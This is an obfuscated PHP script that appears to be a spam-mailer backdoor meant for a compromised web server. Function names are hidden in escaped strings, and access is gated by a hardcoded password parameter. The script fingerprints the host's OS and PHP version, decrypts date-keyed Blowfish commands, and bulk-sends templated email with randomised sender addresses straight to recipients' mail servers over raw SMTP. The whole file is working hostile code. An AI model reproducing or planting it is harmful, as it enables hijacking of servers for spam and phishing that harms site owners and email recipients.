<?php
    $x35="ar\x72\141\171\x5fr\x61\156\144"; $x36="\141\x72r\141y\x5fk\145y\137exi\163\164s"; $x37="ar\x72\141y\137k\x65\171s"; $x38="b\x61\x73\14564_\145\x6e\x63o\144\145"; $x39="ba\163\1456\x34\x5f\144\145c\157de"; $x3a="\x63\150\165n\x6b_\x73\x70\x6ci\164"; $x3b="\143\157un\x74"; $x3c="\144\141\164\x65"; $x3d="d\156s_\147\x65t\x5fr\x65\143\157\x72\x64"; $x3e="e\x78p\154o\144\x65"; $x3f="\x66cl\x6fs\x65"; $x40="f\x67\145t\163"; $x41="\146\163\x6f\143\x6b\157\160\145n"; $x42="\146\x77ri\x74\145"; $x43="\147\x65\x74\150\157\x73\164\142y\156ame"; $x44="g\155m\153t\151me"; $x45="\147\x7a\143o\x6d\160\162\x65ss"; $x46="g\x7a\165\156c\157mp\162\x65ss"; $x47="\x69m\x70\154\x6fd\x65"; $x48="\155\x61\151\x6c"; $x49="m\x63\x72\x79p\x74_\x63r\145\141\164\x65_i\166"; $x4a="\155\x63\162ypt_\x65n\x63\x72\x79\160t"; $x4b="\155\143r\171\160\164_\x64\x65\x63\162\171pt"; $x4c="\155crypt\x5f\147\x65t\137i\x76\137s\x69\172e"; $x4d="md5"; $x4e="\x6d\153\164i\x6de"; $x4f="\x70a\x72\163e_\165rl"; $x50="ph\160_\x75\x6e\141\x6d\145"; $x51="\x70hpv\145\162\163\151\157n"; $x52="\x70r\145g\x5fma\x74\143\x68_a\154l"; $x53="\160\x72e\147\x5f\162\145\160l\141\x63e"; $x54="\160\162\x65\147\137\161uote"; $x55="\160\x72\x65g\x5fm\x61\x74\143h"; $x56="r\141\x6e\x64"; $x57="s\x65\164\137\164\151m\x65\x5fl\x69\x6dit"; $x58="si\x6d\160\x6c\x65\x78\155\154\137\x6coa\144\137s\164\x72\151\x6e\x67"; $x59="\x73\164\162i\163t\162"; $x5a="\x73\x74\x72\x6c\145\156"; $x5b="\x73\164r\145\x61\x6d\137\163\145\x74\x5f\164i\155\x65ou\164"; $x5c="s\164rn\143\x61\163ecm\160"; $x5d="\163\165\x62\163t\162"; $x5e="\163t\162\163\x74\x72"; $x5f="\x74i\155e"; $x60="\x74r\x69m"; $x61="\x75n\151q\151d"; error_reporting(0);$x0b = $x4e();if ($_REQUEST['access'] != 'let_me_in') { die("\147\157\x6f\144");} if ($_REQUEST['do'] == 'check') { $x0c = array( 'os' => $x50(), 'php' => $x51() ); echo json_encode($x0c);}if ($_REQUEST['dns']) { echo json_encode($x3d($_REQUEST['dns']));}if ($_REQUEST['do'] == 'phpinfo') { echo json_encode(parse_phpinfo());}if ($_REQUEST['data']) { $x0d = new Email; $x0d->x0b($_REQUEST['data']); echo $x0d->x12();}class Email { private $x0e = array(); private $x0f = array(); private $x10; private $x11; private $x12 = array(); function x0b($x13) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61; $this->message = $x58($this->x17($x13)); $this->boundary = '--' . $x4d($x61($x5f())); $this->type = $this->message->template['type'] == 'html' ? 'text/html' : 'text/plain'; if (!empty($this->message->macros)) {foreach ($this->message->macros->macro as $x14) {$x15 = (string)$x14['name'];$this->macros[$x15] = array();foreach ($x14->item as $x16) { $this->macros[$x15][] = (string)$x16;}} } foreach ($this->message->recipients->emails as $x17) {foreach($x17->email as $x0d) {$this->recipients[(string)$x17['domain']]['emails'][(int)$x0d['id']] = (string)$x0d;}$this->recipients[(string)$x17['domain']]['mx'] = (string)$x17['mx'];$this->recipients[(string)$x17['domain']]['mx_url'] = (string)$x17['mx_url'];$this->recipients[(string)$x17['domain']]['from'] = (string)$x17['from']; } foreach(new SimpleXMLElement($this->message->settings->asXML(), LIBXML_NOCDATA) as $x18 => $x17) {$x18 = (string)$x17;if ($x59($x17['value'], ',')) {$this->settings->$x18 = (string)$x17['value'];} else {$this->settings->$x18 = (int)$x17['value'];} } } function x0c($x19) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  if ($x52("\174\173\x28.*)}|\125", $x19, $x1a)) {foreach ($x1a[1] as $x14) {$x1b = $this->x0d($x14);if ($x1b['type'] == 'let') { $x1c = $this->x0f($x1b['name']);} else { if ($x1b['type'] == 'pipe') { $x1c = $this->x10($x1b['name']); } else { $x1c = $this->x0e($x1b['name']); }}$x1d = !empty($x1c) ? $x1c[$x35($x1c)] : '[' . $x1b['name'] . ']';if ($x1b['type'] == 'let') $x1b['name'] = 'LET:' . $x1b['name'];if ($x1b['type'] == 'unique') $x1b['name'] = '$' . $x1b['name'];if ($x1b['type'] == 'static') $x1b['name'] = '_' . $x1b['name'];$x19 = $x53('/{' . $x54($x1b['name'], '/') . '}/is', $x1d, $x19, 1);}return $this->x0c($x19); } else {return $x19; } } function x0d($x0e) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  $x13 = array(); if (!$x5c($x0e, 'LET:', 4)) {$x13['type'] = 'let';$x13['name'] = $x5d($x0e, 4); } elseif ($x59($x0e, '|')) {$x13['type'] = 'pipe';$x13['name'] = $x0e; } elseif ($x0e[0] == '_') {$x13['type'] = 'static';$x13['name'] = $x5d($x0e, 1); } elseif ($x0e[0] == '$') {$x13['type'] = 'unique';$x13['name'] = $x5d($x0e, 1); } else {$x13['type'] = 'dynamic';$x13['name'] = $x0e; } return $x13; } function x0e($x15) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  if ($x36($x15, $this->macros)) {return $this->macros[$x15]; } elseif ($x15 == 'LINEDATE') {return array($x3c('Y-m-d H:i:s')); } elseif ($x15 == 'MAIL_TO') {return array($this->post->to); } elseif ($x15 == 'MAILTO_DOMAIN') {$x1e = $x5e($this->post->to, '@');return array($x5d($x1e, 1));} elseif ($x55('/^DIGIT\[(((\d+)-(\d+))|(\d+))\]$/', $x15, $x1f)) {if (isset($x1f[5])) {$x20 = $x21 = $x1f[5];} else {$x20 = $x1f[3];$x21 = $x1f[4];}return array($this->x11('number', $x20, $x21)); } elseif ($x55('/^SYMBOL\[(((\d+)-(\d+))|(\d+))\]$/', $x15, $x1f)) {if (isset($x1f[5])) {$x20 = $x21 = $x1f[5];} else {$x20 = $x1f[3];$x21 = $x1f[4];}return array($this->x11('string', $x20, $x21)); } else return array(); } function x0f($x22) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  return $x3e(',', $x22); } function x10($x22) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  return $x3e('|', $x22); } function x11($x11, $x23, $x24) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  $x25 = ''; if ($x11 == 'string') $x25 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; if ($x11 == 'number') $x25 = '0123456789'; $x26 = $x56($x23, $x24); $x27 = ''; for ($x28 = 0; $x28 < $x26; $x28++) {$x27 .= $x25[$x56(0, $x5a($x25) - 1)]; } return $x27; } function x12() { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  $x57(($this->settings->server_wtime-5)); $this->response = array(); foreach($this->recipients as $x18 => $x17) { $x1e = $x3e("\x40", end($x17['emails']));$x1e = $x1e[1];$this->post->mx = $x17['mx'];$this->post->mx_url = $x17['mx_url']; if ($x17['mx'] == 'determine') {$x29 = $x3d($x1e, DNS_MX);if ($x29) { $this->post->mx = $x29[0]['target']; $this->post->mx_url = 'smtp://'.$x43($x29[0]['target']);}}$this->response[$x18]['status'] = NULL;$this->response[$x18]['ids'] = $x47(',', $x37($x17['emails']));$this->response[$x18]['cnt'] = $x3b($x17['emails']);$this->response[$x18]['queue_id'] =NULL;$this->response[$x18]['domain'] = $x1e;$this->response[$x18]['mx'] = $x17['mx'];$this->response[$x18]['mx_url'] = NULL;$this->response[$x18]['smtp'] = NULL;$this->response[$x18]['curl'] = NULL;if (!$this->post->mx || $this->post->mx == 'determine') {$this->response[$x18]['status'] = 'dns';continue;}$this->post->mx_ip = $x4f($this->post->mx_url);$this->post->mx_ip = $this->post->mx_ip['host'];$this->response[$x18]['mx'] =$this->post->mx;$this->response[$x18]['mx_url'] =$this->post->mx_url; $this->post->from = $this->x0c((string)$this->message->template->email); if ($x17['from']) {$this->post->from = $x5d($x4d($x56()), 0, 7)."@".$x17['from'];}$this->post->to = $x47(",", $x17['emails']);$this->post->name = $this->x0c((string)$this->message->template->sender);$this->post->subject = '=?utf-8?B?'.$x38($this->x0c((string)$this->message->template->subject)).'?=';$this->post->type = $this->message->template['type'] == 'html' ? 'text/html' : 'text/plain';$this->post->text = $this->x0c((string)$this->message->template->body); $this->smtp->boundary = '--'.$x4d($x61($x5f()));$this->smtp->headers = "\x46r\x6fm\072\040\075?\165\164\146-\070\x3f\102\077".$x38($this->post->name)."\077\x3d\040\x3c".$this->post->from.">".PHP_EOL; $this->smtp->headers .= "S\x75bje\143\164:\x20".$this->post->subject.PHP_EOL;$this->smtp->headers .= "M\111M\x45\055\x56\145\x72\x73\x69\157\x6e\x3a\0401\x2e0".PHP_EOL; if (empty($this->message->attaches)) {$this->smtp->headers .= "C\157\156t\145\x6e\x74\x2d\124y\160\x65:\x20".$this->post->type."\073\x20\143\150\x61\x72s\145\164\075\125\x54\106-\070;".PHP_EOL;$this->smtp->body = PHP_EOL.$this->post->text.PHP_EOL; } else { $this->smtp->headers .= 'Content-Type: multipart/mixed; boundary="'.$this->smtp->boundary.'"'.PHP_EOL;$this->smtp->headers .= PHP_EOL."--".$this->smtp->boundary.PHP_EOL;$this->smtp->headers .= "\x43\157n\164ent\x2d\x54\x79\x70\145\x3a\040".$this->post->type."\x3b\040\x63h\x61rs\x65\164=UTF\0558\x3b".PHP_EOL;$this->smtp->body = PHP_EOL.$this->post->text.PHP_EOL; foreach(new SimpleXMLElement($this->message->attaches->asXML(), LIBXML_NOCDATA) as $x2a) { $this->smtp->body .= PHP_EOL."\055-".$this->smtp->boundary.PHP_EOL; $this->smtp->body .= "\x43ont\x65n\x74\055\x54yp\x65\072\x20".$x2a->mime.'; name="'.$this->x0c((string)$x2a->name).'"'.PHP_EOL; $this->smtp->body .= "\x43o\156t\145\x6et-\124ra\x6e\x73f\145\162-\105\x6e\143o\x64\151ng: \x62\x61\163e\x364".PHP_EOL; $this->smtp->body .= PHP_EOL.$x3a($x2a->file).PHP_EOL;}}if ($this->post->mx == 'localhost') {$x2b = $x48($this->post->to, $this->post->subject, $this->smtp->body, $this->smtp->headers, '-f '.$this->post->from);if ($x2b) { $this->response[$x18]['status'] = 'ok';} else { $this->reply = $this->x13();$this->smtp_errs = array(); foreach($x3e(',', $this->settings->smtp_errors) as $x2c) { $x52('#< ('.$x2c.') (.*)#', $this->reply, $x1a, PREG_SET_ORDER); if ($x1a[0][1]) {$this->smtp_errs[] = array('code' => $x60($x1a[0][1]),'mess' => $x60($x1a[0][2])); } }$x52('#queued as (.*)#', $this->reply, $x1a); $this->queue_id = $x60($x1a[1][0]); $this->response[$x18]['queue_id'] = $this->queue_id; if (!$this->smtp_errs && $this->reply) { $this->response[$x18]['status'] = 'ok'; } else { if ($this->smtp_errs) {$this->response[$x18]['status'] = 'smtp';$this->response[$x18]['smtp'] = $this->smtp_errs; } else {$this->response[$x18]['status'] = 'curl'; } }}} else {$this->reply = $this->x13(); $this->smtp_errs = array();foreach($x3e(',', $this->settings->smtp_errors) as $x2c) {$x52('#< ('.$x2c.') (.*)#', $this->reply, $x1a, PREG_SET_ORDER); if ($x1a[0][1]) { $this->smtp_errs[] = array('code' => $x60($x1a[0][1]),'mess' => $x60($x1a[0][2]) ); }} $x52('#queued as (.*)#', $this->reply, $x1a);$this->queue_id = $x60($x1a[1][0]);$this->response[$x18]['queue_id'] = $this->queue_id;if (!$this->smtp_errs && $this->reply) { $this->response[$x18]['status'] = 'ok';} else { if ($this->smtp_errs) { $this->response[$x18]['status'] = 'smtp'; $this->response[$x18]['smtp'] = $this->smtp_errs; } else { $this->response[$x18]['status'] = 'curl'; }}} } return $this->x16(json_encode($this->response)); } function x13() { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61; $this->smtp->headers .= $this->smtp->body; $x2d = $x41($this->post->mx_ip, 25, $x2e, $x2f, $this->settings->server_mx_ctime); if ($x2e) {return false; } else {$x5b($x2d, $this->settings->server_mx_ctime);$x30 .="\x3c\040".$x40($x2d);$x42($x2d, "\110\105\x4c\x4f\x20".$this->post->mx."\r\n"); $x30 .= "\074 ".$x40($x2d);$x42($x2d, "\x4d\x41I\x4c\x20\x46\x52\x4f\x4d\072\x3c".$this->post->from."\x3e\r\n"); $x30 .= "\074\x20".$x40($x2d); $x31 = $x3e(',', $this->post->to);foreach($x31 as $x17) {$x42($x2d, "\122\103\120\124\x20\124\x4f\x3a\074".$x17."\076\r\n"); $x30 .= "<\x20".$x40($x2d);}$x42($x2d, "DA\x54A"."\r\n"); $x30 .= "< ".$x40($x2d);$x32 = '';foreach ($x3e("\n", $this->smtp->headers) as $x17) {$x32 .= $x17."\r\n"; }$x42($x2d, $x32."\r\n");$x42($x2d, "\r\n"."\056"."\r\n"); $x30 .= "\074\040".$x40($x2d);$x42($x2d, "\x51\125\111T"."\r\n"); $x30 .= "\x3c ".$x40($x2d);$x3f($x2d);if (!$x52('#< 2(.*)#', $x30, $x1a, PREG_SET_ORDER)) {return false;}return $x30; } } function x14() { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61; return $x3c('d.m.Y', $x44()); } function x15() { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61;  return $x49($x4c(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND); } function x16($x13) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61; if (!$x13) {return; } $x13 = $x45($x13); $x33 = $x4a(MCRYPT_BLOWFISH, $this->x14(), $x13, MCRYPT_MODE_ECB, $this->x15()); return $x38($x33); } function x17($x13) { global $x35,$x36,$x37,$x38,$x39,$x3a,$x3b,$x3c,$x3d,$x3e,$x3f,$x40,$x41,$x42,$x43,$x44,$x45,$x46,$x47,$x48,$x49,$x4a,$x4b,$x4c,$x4d,$x4e,$x4f,$x50,$x51,$x52,$x53,$x54,$x55,$x56,$x57,$x58,$x59,$x5a,$x5b,$x5c,$x5d,$x5e,$x5f,$x60,$x61; if (!$x13) {return; } $x13 = $x39($x13); $x34 = $x4b(MCRYPT_BLOWFISH, $this->x14(), $x13, MCRYPT_MODE_ECB, $this->x15()); $x33 = $x46($x34); return $x33; }}
?>
